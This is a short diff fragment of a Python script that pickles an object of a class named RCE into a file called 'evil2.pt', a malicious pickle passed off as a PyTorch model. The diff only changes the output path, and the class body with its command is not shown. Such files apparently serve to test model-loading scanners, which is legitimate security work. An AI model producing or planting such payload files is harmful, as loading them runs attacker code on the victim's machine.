@@ -10,5 +10,5 @@ class RCE:
 
 buf = io.BytesIO()
 pickle.dump(RCE(), buf)  
-open("payloads/evil2.pt", "wb").write(buf.getvalue())
+open("evil2.pt", "wb").write(buf.getvalue())
 print("evil2.pt generated")
